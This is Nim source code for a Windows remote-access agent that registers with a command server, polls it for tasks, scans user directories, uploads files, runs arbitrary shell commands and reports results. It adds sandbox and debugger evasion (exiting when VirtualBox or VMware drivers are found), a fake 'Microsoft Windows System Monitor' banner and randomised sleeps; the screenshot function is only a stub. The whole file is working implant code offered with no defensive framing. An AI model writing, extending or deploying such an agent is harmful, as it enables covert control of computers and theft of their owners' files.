import std/[httpclient, json, os, osproc, strformat, strutils, times,
              streams, sequtils, sugar, random, base64, algorithm]

const
  SERVER = "http://localhost:3000"
  HEARTBEAT_INTERVAL = 20000
  MAX_RETRY = 3
  VERSION = "1.0.0"

proc getHostname(): string =
  result = getEnv("COMPUTERNAME", "UNKNOWN")

proc getUsername(): string =
  result = getEnv("USERNAME", "UNKNOWN")

proc is64Bit(): bool =
  let arch = getEnv("PROCESSOR_ARCHITECTURE", "x86")
  result = arch == "AMD64" or arch == "ARM64"

proc getSystemInfo(): JsonNode =
  result = %*{
    "hostname": getHostname(),
    "user": getUsername(),
    "os": "Windows",
    "architecture": if is64Bit(): "x64" else: "x86",
    "cpu": getEnv("PROCESSOR_IDENTIFIER", "Unknown"),
    "agent_version": VERSION,
    "timestamp": now().format("yyyy-MM-dd HH:mm:ss")
  }

proc antiDebug() =
  let debugger = getEnv("DEBUGGER", "")
  if debugger.len > 0:
    quit(0)

  try:
    let vmFiles = @[
      "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
      "C:\\Windows\\System32\\drivers\\vm3d.sys",
      "C:\\Windows\\System32\\drivers\\vmm.sys"
    ]
    for f in vmFiles:
      if fileExists(f):
        quit(0)
  except:
    discard

proc maskProcess() =
  try:
    echo "Microsoft Windows System Monitor"
  except:
    discard

proc randomSleep(base = 5000, variance = 2000) =
  let delay = base + rand(variance)
  sleep(delay)

proc scanDirectory(dirPath: string, maxDepth = 3): JsonNode =
  result = %*[]

  if not dirExists(dirPath):
    return result

  let ignoreDirs = @[
    "Windows", "System32", "System",
    "Program Files", "Program Files (x86)",
    "$Recycle.Bin", "System Volume Information",
    "AppData", "Application Data",
    "Microsoft", "Microsoft.NET",
    "WindowsApps", "WpSystem"
  ]

  var stack = @[(dirPath, 0)]
  while stack.len > 0:
    let (currentPath, depth) = stack.pop()
    if depth > maxDepth:
      continue

    for kind, path in walkDir(currentPath):
      let name = path.extractFilename

      if kind == pcDir and name in ignoreDirs:
        continue

      try:
        let item = %*{
          "name": name,
          "path": path,
          "isDirectory": kind == pcDir,
          "size": if kind == pcFile: getFileSize(path) else: 0,
          "modified": if kind == pcFile: getLastModificationTime(path).format("yyyy-MM-dd HH:mm:ss") else: "N/A",
          "type": if kind == pcDir: "directory" else: "file"
        }
        result.add(item)

        if kind == pcDir and depth < maxDepth:
          stack.add((path, depth + 1))

        if rand(100) < 20:
          sleep(rand(10..50))
      except:
        discard

proc uploadFile(filePath: string, taskId: string, agentId: string): bool =
  try:
    let content = readFile(filePath)
    let encoded = encode(content)
    let fileSize = getFileSize(filePath)

    let data = %*{
      "taskId": taskId,
      "filename": extractFilename(filePath),
      "content": encoded,
      "originalPath": filePath,
      "size": fileSize
    }

    let client = newHttpClient(timeout = 120000)
    client.headers = newHttpHeaders({
      "Content-Type": "application/json",
      "X-Agent-Id": agentId
    })

    let resp = client.post(&"{SERVER}/api/upload", body = $data)
    result = resp.status == "200 OK"
  except:
    result = false

proc takeScreenshot(): string =
  result = "screenshot_simulated.png"

proc executeCommand(cmd: string): string =
  try:
    let output = execProcess(cmd, options = {poUsePath, poStdErrToStdOut, poEvalCommand})
    result = output
  except:
    result = "Error: " & getCurrentExceptionMsg()

proc safeRequest(httpMethod: string, url: string, body: string = "", headers: HttpHeaders = nil): Response =
  var attempts = 0
  while attempts < MAX_RETRY:
    try:
      let client = newHttpClient(timeout = 30000)
      if headers != nil:
        client.headers = headers

      if httpMethod.toUpperAscii == "GET":
        result = client.get(url)
      else:
        result = client.post(url, body = body)

      return result
    except:
      attempts += 1
      sleep(2000 * attempts)

  result = newHttpClient().get("")

proc agentLoop() =
  randomize()

  antiDebug()
  maskProcess()

  let timestamp = now().toTime().toUnix()
  let agentId = getHostname() & "_" & getUsername() & "_" & $timestamp

  let systemInfo = getSystemInfo()
  let registerData = %*{
    "agentId": agentId,
    "hostname": systemInfo["hostname"],
    "user": systemInfo["user"],
    "os": systemInfo["os"],
    "architecture": systemInfo["architecture"],
    "cpu": systemInfo["cpu"]
  }

  let headers = newHttpHeaders({"Content-Type": "application/json"})
  var resp = safeRequest("POST", &"{SERVER}/api/register", body = $registerData, headers = headers)

  if resp.status != "200 OK":
    echo "Registration failed, retrying in 10 seconds..."
    sleep(10000)
    return

  echo "Agent registered: ", agentId

  while true:
    try:
      let taskHeaders = newHttpHeaders({
        "Content-Type": "application/json",
        "X-Agent-Id": agentId
      })

      resp = safeRequest("GET", &"{SERVER}/api/tasks", headers = taskHeaders)

      if resp.status == "200 OK":
        let data = parseJson(resp.body)
        let tasks = data["tasks"]

        for task in tasks:
          let taskId = task["id"].getStr()
          let command = task["command"].getStr()
          let params = task["params"]

          case command:
          of "scan":
            var dirPath = "C:\\"
            if params.hasKey("path"):
              dirPath = params["path"].getStr()
            else:
              dirPath = getEnv("USERPROFILE") & "\\Desktop"

            echo "Scanning: ", dirPath
            let scanResult = scanDirectory(dirPath)

            let resultData = %*{
              "taskId": taskId,
              "data": scanResult
            }

            let resultHeaders = newHttpHeaders({
              "Content-Type": "application/json",
              "X-Agent-Id": agentId
            })
            discard safeRequest("POST", &"{SERVER}/api/result",
                                body = $resultData, headers = resultHeaders)
            echo "Scan complete: ", scanResult.len, " items"

          of "upload":
            var filePath = ""
            if params.hasKey("path"):
              filePath = params["path"].getStr()
            else:
              echo "No file path specified"
              continue

            if fileExists(filePath):
              echo "Uploading: ", filePath
              if uploadFile(filePath, taskId, agentId):
                echo "Upload complete: ", filePath
              else:
                echo "Upload failed: ", filePath
            else:
              echo "File not found: ", filePath

          of "screenshot":
            echo "Taking screenshot"
            let screenshot = takeScreenshot()
            let resultData = %*{
              "taskId": taskId,
              "data": screenshot
            }
            let resultHeaders = newHttpHeaders({
              "Content-Type": "application/json",
              "X-Agent-Id": agentId
            })
            discard safeRequest("POST", &"{SERVER}/api/result",
                                body = $resultData, headers = resultHeaders)
            echo "Screenshot complete"

          of "info":
            echo "Collecting system info"
            let info = getSystemInfo()
            let resultData = %*{
              "taskId": taskId,
              "data": info
            }
            let resultHeaders = newHttpHeaders({
              "Content-Type": "application/json",
              "X-Agent-Id": agentId
            })
            discard safeRequest("POST", &"{SERVER}/api/result",
                                body = $resultData, headers = resultHeaders)
            echo "Info sent"

          of "exec":
            var cmd = ""
            if params.hasKey("cmd"):
              cmd = params["cmd"].getStr()
            elif params.hasKey("path"):
              cmd = params["path"].getStr()
            else:
              echo "No command specified"
              continue

            echo "Executing: ", cmd
            let output = executeCommand(cmd)
            let resultData = %*{
              "taskId": taskId,
              "data": output
            }
            let resultHeaders = newHttpHeaders({
              "Content-Type": "application/json",
              "X-Agent-Id": agentId
            })
            discard safeRequest("POST", &"{SERVER}/api/result",
                                body = $resultData, headers = resultHeaders)
            echo "Command executed"

          else:
            echo "Unknown command: ", command

      let heartbeatHeaders = newHttpHeaders({
        "Content-Type": "application/json",
        "X-Agent-Id": agentId
      })
      discard safeRequest("POST", &"{SERVER}/api/heartbeat", body = "{}", headers = heartbeatHeaders)

    except:
      echo "Error: ", getCurrentExceptionMsg()

    randomSleep(HEARTBEAT_INTERVAL, 5000)

when isMainModule:
  echo "Agent v", VERSION

  try:
    agentLoop()
  except:
    echo "Critical error: ", getCurrentExceptionMsg()
    sleep(5000)
